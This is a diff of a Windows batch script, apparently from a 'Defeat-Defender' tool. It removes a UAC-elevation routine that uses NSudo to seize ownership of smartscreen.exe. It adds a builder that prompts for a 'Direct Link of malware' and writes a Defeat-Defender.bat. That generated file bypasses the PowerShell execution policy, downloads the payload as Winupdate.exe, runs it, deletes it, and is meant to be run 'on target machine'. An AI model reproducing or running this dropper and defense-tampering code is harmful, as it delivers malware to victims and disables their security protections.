@@ -1,28 +1,35 @@
-@echo on
-:: BatchGotAdmin
-::-------------------------------------
-REM  --> Check for permission
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+@echo off
 
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
+setlocal enabledelayedexpansion
 
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"="
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+set /p a="Enter the Direct Link of malware : "
 
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
+if [%a%]==[] ( 
+CALL:error
+pause
+EXIT /B %ERRORLEVEL% 
+) 
 
-:gotAdmin
-cd %temp%
-NSudo.exe -U:T takeown /f "%systemroot%\System32\smartscreen.exe" /a
+if [%a%] NEQ [] (
+CALL:main
+pause
+EXIT /B %ERRORLEVEL% 
+)
 
-NSudo.exe -U:T icacls "%systemroot%\System32\smartscreen.exe" /reset
-
-NSudo.exe -U:T icacls "%systemroot%\System32\smartscreen.exe" /setowner *S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464
+:main
+echo.
+echo Your  Url is :  %a% 
+echo. >>Defeat-Defender.bat
+echo mkdir %temp%\temp_folder >>Defeat-Defender.bat
+echo powershell -command "Set-ExecutionPolicy Bypass" >>Defeat-Defender.bat
+echo powershell -command "Invoke-WebRequest -Uri %a% -OutFile %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
+echo powershell -command "start %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
+echo timeout 4 >>Defeat-Defender.bat
+echo powershell -command "del %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
+echo powershell -command "rmdir %temp%\temp_folder" >>Defeat-Defender.bat
+echo.
+echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
+EXIT /B %ERRORLEVEL% 
+:error
+echo.
+echo Please Enter the link And Try Again!!!
